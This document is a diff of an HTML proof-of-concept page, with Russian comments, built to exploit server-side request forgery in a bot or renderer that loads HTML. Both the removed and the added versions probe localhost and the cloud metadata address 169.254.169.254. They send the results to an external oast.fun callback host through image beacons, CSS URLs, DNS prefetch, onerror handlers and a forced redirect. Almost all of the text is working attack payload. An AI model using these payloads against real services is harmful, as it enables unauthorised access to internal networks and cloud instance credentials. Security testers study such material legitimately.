@@ -1,44 +1,29 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC Full SSRF Evidence</title>
+    <meta charset="UTF-8">
+    <link rel="dns-prefetch" href="http://dns_leak_v8.esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun">
+    
+    <style>
+        body {
+            background-image: url("http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/CSS_LEAK_START");
+        }
+        /* Попытка достучаться до метаданных через CSS (если браузер разрешит) */
+        @font-face {
+            font-family: 'ssrf';
+            src: url('http://169.254.169.254/latest/meta-data/instance-id');
+        }
+    </style>
 </head>
 <body>
+    <img src="http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/IMG_TAG_LEAK">
+    
+    <img src="http://127.0.0.1:80/favicon.ico" onerror="document.body.style.backgroundColor='red'; new Image().src='http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/LOCAL_80_HIT';">
+
     <script>
-        const oast = "http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun";
-
-        function probe(url, label) {
-            const start = performance.now();
-            const img = new Image();
-            
-            img.onload = function() {
-                const duration = Math.round(performance.now() - start);
-                new Image().src = `${oast}/ALIVE_${label}?time=${duration}ms`;
-            };
-            
-            img.onerror = function() {
-                const duration = Math.round(performance.now() - start);
-                // Если ошибка прилетела слишком быстро — порта нет. 
-                // Если долго — порт открыт, но это не картинка.
-                new Image().src = `${oast}/ERROR_${label}?time=${duration}ms`;
-            };
-
-            img.src = url;
-        }
-
-        // 1. Проверка реальных внутренних эндпоинтов
-        probe("http://127.0.0.1:80/favicon.ico", "LOCAL_HTTP");
-        probe("http://169.254.169.254/latest/meta-data/", "CLOUD_METADATA");
-        
-        // 2. Проверка порта, которого ТОЧНО НЕТ (для сравнения времени)
-        probe("http://127.0.0.1:54321/nonexistent", "NON_EXISTENT_PORT");
-
-        // 3. Попытка вытянуть длину контента через audio (иногда работает там, где картинки нет)
-        const aud = document.createElement('audio');
-        aud.onloadedmetadata = () => new Image().src = `${oast}/AUDIO_SIZE_LEAK`;
-        aud.src = "http://169.254.169.254/latest/meta-data/";
+        // Последняя отчаянная попытка: синхронный редирект
+        // Если бот просто быстро закрывается, мы заставим его перейти по ссылке
+        window.location.replace("http://esqbwjbyepcxrsacleqfj8d083r6aniqm.oast.fun/FINAL_SYNC_REDIRECT");
     </script>
-
-    <link rel="icon" href="http://127.0.0.1:80/force_ping">
 </body>
 </html>
